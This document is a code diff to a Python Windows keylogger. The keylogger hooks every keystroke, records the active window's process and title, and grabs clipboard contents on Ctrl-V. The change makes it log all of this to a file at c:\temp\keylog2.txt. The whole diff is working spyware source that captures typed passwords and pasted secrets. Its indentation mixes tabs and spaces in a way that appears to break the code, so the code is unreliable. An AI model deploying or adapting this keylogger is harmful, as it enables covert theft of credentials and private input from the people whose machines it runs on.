@@ -2,11 +2,18 @@ from ctypes import *
 import pythoncom
 import pyHook
 import win32clipboard
+import logging
 
 user32 = windll.user32
 kernel32 = windll.kernel32
 psapi = windll.psapi
 current_window = None
+
+# log file name - directory has to exist, could make it create as necessary
+file_log='c:\\temp\\keylog2.txt'
+
+# setup some basics for the logging
+logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
 
 def get_current_process():
 	# get a handle to the foreground window
@@ -29,37 +36,35 @@ def get_current_process():
 	window_title = create_string_buffer("\x00" * 512)
 	lenght = user32.GetWindowTextA(hwnd, bref(window_title), 512)
 
-	# print out the header if we're in the right process
-	print("\n[PID: {0} - {1} - {2}").format(process_id, executable.value, window.title_value)
+	# log out the header if we're in the right process
+    	logging.log(logging.DEBUG, "[PID: {0} - {1} - {2}".format(process_id, executable.value, window_title.value))
 
 	# close the handles
 	kernel32.CloseHandle(hwnd)
 	kernel32.CloseHandle(h_process)
-	
-file_log = 'keyloggeroutput.txt'
 
 def key_stroke(event):
-	logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
+	
 	global current_window
 
 	# check if target changed windows
 	if event.WindowName != current_window:
 		current_window = event.WindowName
-		get_current_process()
+		
+	get_current_process()
 
-	# if a standart key is pressed
-	if event.Ascii in range(32, 128):
-		print(chr(event.Ascii))
-	else:
-		# if [Ctrl-V] was pressed
-		if event.Key == "V":
-			win32clipboard.OpenClipboard()
-			pasted_value = win32clipboard.GetClipboardData()
-			win32clipboard.CloseClipboard()
-
-			print("[PASTE] - {0}".format(pasted_value))
-		else:
-			print ("{0}".format(event.Key))
+	# if a standard key is pressed
+    if event.Ascii in range(32, 128):
+        logging.log(logging.DEBUG, chr(event.Ascii))
+    else:
+        # if [Ctrl-V] was pressed
+        if event.Key == "V":
+            win32clipboard.OpenClipboard()
+            pasted_value = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
+            logging.log(logging.DEBUG, "[PASTE] - {0}".format(pasted_value))
+        else:
+            logging.log(logging.DEBUG, "{0}".format(event.Key))
 
 	# pass execution to the next registered hook
 	return True
